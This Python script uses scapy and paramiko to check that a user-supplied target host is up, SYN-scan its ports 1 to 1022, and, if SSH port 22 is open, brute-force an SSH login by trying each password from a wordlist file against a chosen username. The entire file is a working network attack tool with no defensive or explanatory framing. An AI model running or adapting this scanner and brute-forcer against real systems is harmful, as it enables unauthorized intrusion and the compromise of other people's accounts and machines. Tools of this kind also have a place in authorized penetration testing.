import paramiko
from scapy.all import*
from scapy.config import conf
from scapy.layers.inet import IP, TCP, ICMP
from scapy.volatile import RandShort
from paramiko import *

open_ports = []

def scan_port(port):
    source_port = RandShort()
    conf.verb = 0  # hide all verbose of scapy
    pkt = (IP(dst=Target)/TCP(sport=source_port, dport=port, flags="S"))
    syn_pkt = sr1(pkt, timeout=0.5)
    if syn_pkt == None:
        return False
    elif syn_pkt.haslayer(TCP) == None:
        return False
    elif syn_pkt[TCP].flags == 0x12:
        sr(IP(dst=Target)/TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True


def check_avb():
    try:
        conf.verb = 0
        ans = sr1(IP(dst=Target)/ICMP(), timeout=3)
        if ans:
            print(f"Target {Target} available!")
            return True
        else:
            return False
    except Exception as ex:
        print(ex)
        return False

def BruteForce(port):
    with open(r'PasswordList.txt') as file:
        passwords = file.readlines()

    user = input("Username: ")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in passwords:
        password = password.replace("\n", "")
        try:
            SSHconn.connect(Target, port=int(port), username=user, password=password, timeout=1)
            print(f"Password: {password} - correct for user: {user}")
            SSHconn.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print(f"Password: {password} - failed")


if __name__ == '__main__':
    Target = input("Input target: ")
    registered_ports = range(1, 1023)
    if check_avb() == True:
        print(f'Scanning open ports...')
        for ports in registered_ports:
            status = scan_port(ports)
            if status == True:
                open_ports.append(ports)
                print(f"[+] Port {ports} is open!")
        print("Finished scanning")
        if 22 in open_ports:
            choice = input('Do you want perform a brute-force attack on port 22 (SSH)? "yes" or "no"?')
            if choice == "y" or choice == "Y" or choice == "yes":
                BruteForce(22)
